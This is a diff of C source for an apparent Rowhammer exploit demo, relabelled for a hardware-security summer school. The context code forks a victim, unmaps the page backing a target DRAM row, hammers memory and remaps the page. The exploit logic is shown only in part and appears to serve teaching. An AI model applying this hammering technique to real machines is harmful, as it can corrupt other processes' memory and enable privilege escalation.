@@ -125,7 +125,7 @@ static void bitflip_rep(struct AddrEntry a, size_t off, uint8_t exp,
 }
 
 // Function to try to exploit the reported bitflips
-// ******** FDP Demo ********
+// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 // Entry point for the exploit
 int num_exploit_tries = 100;
 void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, void* arg)
@@ -133,7 +133,7 @@ void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, vo
 	bitflip_rep(a, off, exp, got, arg);
 	// if(off >= 0x100)	return;
 	set_affinity(0);
-	// ******** FDP Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// launching victim process
 	int pid_to_signal = fork();
 	if(pid_to_signal == 0){
@@ -145,7 +145,7 @@ void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, vo
 	sleep(1);
 	char* va = (void*)a.virtp;
 	printf("0: %llx \n", get_physical_pfn(va));
-	// ******** FDP Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Unmap the OS victim page associated with DRAM victim row
 	munmap(va, 4096);
 	int ret = kill(pid_to_signal, SIGALRM);
@@ -156,14 +156,14 @@ void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, vo
 	sleep(1);
 	struct ProfileCtx* c = data_for_hammering.c;
 	printf("Started hammering\n");
-	// ******** FDP Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Perform the hammering
 	while(true) {
 		if (waitpid(pid_to_signal, NULL, WNOHANG) == pid_to_signal) {
 			printf("Victim ended execution\n");
 			break;
 		}
-		// ******** FDP Demo ********
+		// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 		// hammer function
 		c->hamfunc(data_for_hammering.va1, data_for_hammering.va2, c->cal * c->cal_mult, c->hamopt);
 		c->hamfunc(data_for_hammering.va1, data_for_hammering.va2, c->cal * c->cal_mult, c->hamopt);
@@ -171,7 +171,7 @@ void try_to_exploit(struct AddrEntry a, size_t off, uint8_t exp, uint8_t got, vo
 	}
 	// ************************************
 	num_exploit_tries++;
-	// ******** FDP Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Map the OS victim page back
 	char* temp = mmap(va, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_POPULATE, 0, 0);
 	assert(temp == va);
